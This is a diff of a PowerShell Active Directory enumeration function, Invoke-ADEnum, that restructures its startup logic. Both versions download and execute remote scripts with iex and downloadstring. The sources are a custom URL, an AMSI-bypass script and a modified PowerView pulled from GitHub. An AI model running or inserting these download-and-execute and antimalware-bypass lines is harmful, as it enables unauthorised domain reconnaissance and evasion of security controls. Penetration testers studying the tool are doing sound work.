@@ -128,50 +128,56 @@ function Invoke-ADEnum
 	
 	Set-Variable MaximumHistoryCount 32767
 	
-	if($Local){ipmo $Local -Force}
+	if($help){}
 	
 	else{
-		if($CustomURL){
-			try{
-				iex(new-object net.webclient).downloadstring("$CustomURL")
+	
+		if($Local){ipmo $Local -Force}
+		
+		else{
+			if($CustomURL){
+				try{
+					iex(new-object net.webclient).downloadstring("$CustomURL")
+				}
+				catch{
+					$errorMessage = $_.Exception.Message
+					Write-Host ""
+					Write-Host "$errorMessage" -ForegroundColor Red
+					Write-Host ""
+					break
+				}
 			}
-			catch{
-				$errorMessage = $_.Exception.Message
-				Write-Host ""
-				Write-Host "$errorMessage" -ForegroundColor Red
-				Write-Host ""
-				break
+			
+			else{
+				try{
+					iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1')
+					iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/PowerView_Mod.ps1')
+				}
+				catch{
+					$errorMessage = $_.Exception.Message
+					Write-Host ""
+					Write-Host "$errorMessage" -ForegroundColor Red
+					Write-Host ""
+					break
+				}
 			}
 		}
 		
-		else{
-			try{
-				iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1')
-				iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/PowerView_Mod.ps1')
-			}
-			catch{
-				$errorMessage = $_.Exception.Message
-				Write-Host ""
-				Write-Host "$errorMessage" -ForegroundColor Red
-				Write-Host ""
-				break
-			}
-		}
-	}
-    
-    if($Domain){
-		if($Server){}
-		else{
-			$Server = Get-DomainController -Domain $Domain | Where-Object {$_.Roles -like "RidRole"} | Select-Object -ExpandProperty Name
+		if($Domain){
 			if($Server){}
-			else{$Server = Read-Host "Enter the DC FQDN"}
+			else{
+				$Server = Get-DomainController -Domain $Domain | Where-Object {$_.Roles -like "RidRole"} | Select-Object -ExpandProperty Name
+				if($Server){}
+				else{$Server = Read-Host "Enter the DC FQDN"}
+			}
 		}
-    }
 
-    elseif($Server -and !$Domain){
-		$Domain = Read-Host "Enter the domain name"
-		#$ServerParam = [Parameter(Mandatory=$True, Position=2, ValueFromPipeline=$true)][String]$Server
-    }
+		elseif($Server -and !$Domain){
+			$Domain = Read-Host "Enter the domain name"
+			#$ServerParam = [Parameter(Mandatory=$True, Position=2, ValueFromPipeline=$true)][String]$Server
+		}
+		
+	}
     
     # Set the path and filename for the output file
     if($Output){$OutputFilePath = $Output}
